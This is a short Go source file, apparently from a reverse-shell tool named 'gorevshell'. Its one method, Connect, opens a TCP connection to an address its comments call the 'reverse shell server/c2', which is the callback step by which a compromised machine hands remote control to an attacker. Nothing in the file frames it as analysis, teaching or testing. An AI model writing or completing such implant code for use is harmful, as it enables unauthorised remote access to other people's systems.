package gorevshell

import (
	"fmt"
	"net"
)

func (r *GoRevShell) Connect() {
	//connects to reverse shell server/c2
	var err error
	r.con, err = net.DialTCP("tcp", nil, r.address) //dial c2
	termErr("[-] connecting: ", err)
	fmt.Println("[+] Connected : ", r.address)
}
